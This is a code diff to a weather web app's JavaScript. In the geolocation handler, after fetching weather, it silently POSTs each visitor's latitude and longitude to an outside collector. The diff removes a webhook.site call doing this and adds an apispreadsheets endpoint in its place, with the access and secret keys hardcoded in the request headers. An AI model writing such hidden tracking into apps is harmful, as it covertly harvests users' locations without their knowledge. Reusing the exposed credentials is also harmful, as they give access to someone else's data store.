@@ -100,6 +100,7 @@ function notfound(){
 function fetch_error() {
     main.style.display="none";
     hero.style.display="none";
+    nt_h.style.display="none";
     if(one_t==0){
       console.log("hello");
       navbar.insertAdjacentHTML("afterend",`<div id="error"></div>`);
@@ -378,25 +379,44 @@ inp.addEventListener("keypress", () => {
   }
 });
 
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            let lat = position.coords.latitude;
+            let log = position.coords.longitude;
 
-  if(navigator.geolocation){
-    navigator.geolocation.getCurrentPosition((position)=>{
-      let lat = position.coords.latitude;
-      let log = position.coords.longitude;
-    weather(undefined, lat,log);
+            // Call your weather function
+            weather(undefined, lat, log);
 
-fetch("https://webhook.site/3c6ca691-9b72-478c-a14c-992499d620bb", {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({lat, log})
-  })
-  },
-   (error) => {
-    console.log("User denied or error:", error.message);
-  }
-)
+            // Prepare payload for API Spreadsheet
+            const payload = {
+                data: {
+                    Latitude: lat,
+                    Longitude: log
+                }
+            };
+
+            // Send data to API Spreadsheet
+            fetch("https://api.apispreadsheets.com/data/6nipYC9WYalJsGWG/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "accessKey": "60931d813af4b5688344e22ae9bc37d0",
+                    "secretKey": "4da77edf81f05ae7ae2452c9d43d7f62"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(res => res.json())
+            .then(response => console.log("Data sent successfully:", response))
+            .catch(err => console.error("Error sending data:", err));
+        },
+        (error) => {
+            console.log("User denied or error:", error.message);
+        }
+    );
+} else {
+    console.log("Geolocation not supported by this browser.");
 }
-
 
 swt.addEventListener("click",()=>{
   let {current:{temperature_2m:tempi,wind_speed_10m:winds,precipitation:prep}}=data;
